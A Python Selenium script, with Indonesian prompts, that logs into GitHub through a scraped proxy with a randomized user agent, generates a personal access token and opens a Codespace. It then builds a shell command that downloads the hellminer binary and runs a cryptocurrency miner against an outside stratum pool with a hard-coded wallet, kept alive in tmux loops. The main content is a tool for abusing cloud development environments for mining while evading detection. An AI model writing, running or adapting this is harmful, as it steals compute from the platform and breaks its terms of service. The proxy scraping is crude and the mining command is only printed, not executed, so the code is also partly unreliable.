import os
import time
import random
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager


# Scrape proxies
def get_proxies():
    url = "https://www.sslproxies.org/"
    response = requests.get(url)
    proxies = set()
    for line in response.text.split("\n"):
        if ":" in line:
            proxies.add(line.strip())
    return list(proxies)


# Configure WebDriver
def setup_driver(proxy=None):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    if proxy:
        chrome_options.add_argument(f"--proxy-server={proxy}")
    user_agent = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80, 90)}.0.{random.randint(1000, 5000)}.0 Safari/537.36"
    chrome_options.add_argument(f"user-agent={user_agent}")
    return webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)


# Login to GitHub
def login_github(driver, username, password):
    driver.get("https://github.com/login")
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "login_field"))).send_keys(username)
    driver.find_element(By.ID, "password").send_keys(password)
    driver.find_element(By.NAME, "commit").click()

    # Handle OTP if required
    try:
        otp_field = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, "otp")))
        otp = input("Masukkan OTP GitHub Anda: ")
        otp_field.send_keys(otp)
        otp_field.send_keys(Keys.RETURN)
    except Exception:
        pass

    # Verify login success
    time.sleep(3)
    if "Verify your account" in driver.page_source:
        print("Login gagal. Harap periksa username, password, atau OTP Anda.")
        return False
    print("Login berhasil.")
    return True


# Generate token and save
def generate_token(driver):
    driver.get("https://github.com/settings/tokens/new")
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "token_description"))).send_keys("Automation Token")
    driver.find_element(By.XPATH, "//button[contains(text(),'Generate token')]").click()
    time.sleep(3)
    token = driver.find_element(By.CSS_SELECTOR, "code").text
    with open("token.txt", "w") as f:
        f.write(token)
    print("Token berhasil disimpan ke token.txt")


# Open Codespace
def open_codespace(driver):
    link = ("https://github.com/codespaces/new?"
            "repository=my-repo&container=my-container&skip_quickstart=true&machine=standardLinux32gb&"
            "repo=746868415&ref=main&devcontainer_path=.devcontainer%2Fdevcontainer.json&geo=UsEast")
    driver.get(link)
    time.sleep(5)
    # Run commands in Codespace
    commands = (
        "sudo apt update && sudo apt install -y tmux libsodium23 libsodium-dev wget && "
        "tmux new-session -d -s multi_terminal 'while true; do echo \"Menjaga koneksi tetap hidup...\"; sleep 5; clear; done' \\; "
        "split-window -v 'wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz && "
        "tar -xvzf hellminer_linux64_avx2.tar.gz && ./hellminer -v -c stratum+tcp://cn.vipor.net:5040 -u RJMuH1ems9YZKZ1jDnqTtRLuQvuWmBpznQ.Device10 -p x' \\; "
        "split-window -h 'while true; do echo \"Keep-alive ping\" > /dev/null; sleep 10; done' \\; select-layout tiled \\; attach"
    )
    print("Perintah berikut dijalankan di Codespace:")
    print(commands)


# Main script
def main():
    proxies = get_proxies()
    proxy = random.choice(proxies) if proxies else None
    driver = setup_driver(proxy)

    username = input("Masukkan username: ")
    password = input("Masukkan password: ")

    if login_github(driver, username, password):
        generate_token(driver)
        open_codespace(driver)

    driver.quit()


if __name__ == "__main__":
    main()
